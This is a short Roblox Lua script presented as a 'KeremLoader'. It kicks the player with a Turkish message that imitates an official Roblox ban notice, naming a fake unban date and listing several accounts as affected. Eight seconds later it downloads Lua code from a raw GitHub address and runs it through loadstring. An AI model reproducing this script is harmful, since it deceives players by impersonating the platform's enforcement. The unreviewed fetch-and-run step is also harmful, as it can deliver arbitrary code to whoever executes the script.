print('OK-KeremLoader')

--- Put anything here that will run
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local username = player.Name

player:Kick(
    "Roblox erişiminiz engellendi.\n" ..
    "Tahmini ban kaldırma tarihi: 03.09.2026\n" ..
    "Etkilenen hesaplar: Bu hesap (" .. username .. "), Benmal (@thekerem432), keremoguztopuz (@keremoguztopuz) ve bu tarihten sonra açtığınız tüm hesaplar.\n" ..
    "Eğer bunun bir hata olduğunu düşünüyorsanız: https://www.roblox.com/support"
)
task.wait(8)

loadstring(game:HttpGet('https://raw.githubusercontent.com/yusufxbenxs/Gamebuddy/refs/heads/main/Loader.lua'))()
